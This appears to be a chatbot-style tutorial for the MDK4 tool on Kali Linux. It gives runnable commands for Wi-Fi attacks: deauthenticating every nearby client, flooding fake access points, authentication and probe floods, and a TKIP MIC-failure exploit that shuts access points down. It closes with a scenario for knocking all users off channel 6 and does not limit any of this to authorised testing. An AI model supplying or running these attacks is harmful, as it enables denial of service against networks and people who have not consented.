‚úÖ Step-by-Step: Using MDK4 in Kali Linux
üîß 1. Install MDK4
MDK4 is not pre-installed in Kali. Use the following commands:

bash
Copy
Edit
sudo apt update
sudo apt install mdk4
To verify installation:

bash
Copy
Edit
mdk4 --help
üì∂ 2. Put Wi-Fi Adapter in Monitor Mode
You need a Wi-Fi card that supports monitor mode and packet injection (e.g., Alfa AWUS036NHA).

bash
Copy
Edit
sudo airmon-ng check kill
sudo airmon-ng start wlan0
This creates an interface like wlan0mon. Use this in all further commands.

üö® 3. Basic Attack Modes in MDK4
Here are the most common modes of jamming:

‚ñ∂Ô∏è A. Deauthentication Attack (Mode d) ‚Äì Disconnect Devices
bash
Copy
Edit
sudo mdk4 wlan0mon d
This sends deauth packets to all nearby clients.

üëâ More specific:

bash
Copy
Edit
sudo mdk4 wlan0mon d -c [channel] -t [target MAC]
Example:

bash
Copy
Edit
sudo mdk4 wlan0mon d -c 6 -t AA:BB:CC:DD:EE:FF
‚ñ∂Ô∏è B. Beacon Flood Attack (Mode b) ‚Äì Fake Networks Flood
bash
Copy
Edit
sudo mdk4 wlan0mon b -f fake_aps.txt
Content of fake_aps.txt:

objectivec
Copy
Edit
Free_WiFi
Hacked_Network
Internet_404
NSA_Spy_AP
Creates dozens of fake SSIDs to confuse nearby users or devices.

‚ñ∂Ô∏è C. Authentication DoS (Mode a) ‚Äì Spam APs with Auth Requests
bash
Copy
Edit
sudo mdk4 wlan0mon a -a [BSSID] -i [SSID]
Floods the target access point with bogus authentication requests.

‚ñ∂Ô∏è D. Probe Request Flood (Mode p) ‚Äì Spam with device probe requests
bash
Copy
Edit
sudo mdk4 wlan0mon p
Simulates devices constantly probing for networks.

‚ñ∂Ô∏è E. Michael MIC Failure Exploit (Mode m) ‚Äì Exploit TKIP vulnerability
bash
Copy
Edit
sudo mdk4 wlan0mon m -t [target MAC] -c [channel]
Causes AP to shut down if repeated MIC failures occur (WPA1/WPA2-TKIP only).

‚ùå 4. Stop Monitor Mode
When done, restore normal network:

bash
Copy
Edit
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
üìÅ Example Attack Scenario
Goal: Disconnect all users from Wi-Fi Channel 6
bash
Copy
Edit
sudo airmon-ng start wlan0
sudo mdk4 wlan0mon d -c 6
Let it run for ~30 seconds, then stop with Ctrl + C.

üìÑ Useful Tips
Tool	Purpose
airodump-ng	Scan for nearby Wi-Fi networks and channels
airmon-ng	Switch modes on interfaces
mdk4	Execute jamming/deauth attacks

üõ† Optional: Compile Latest MDK4 from Source
If apt version is buggy:

bash
Copy
Edit
sudo apt install git build-essential libpcap-dev
git clone https://github.com/aircrack-ng/mdk4.git
cd mdk4
make
sudo make install
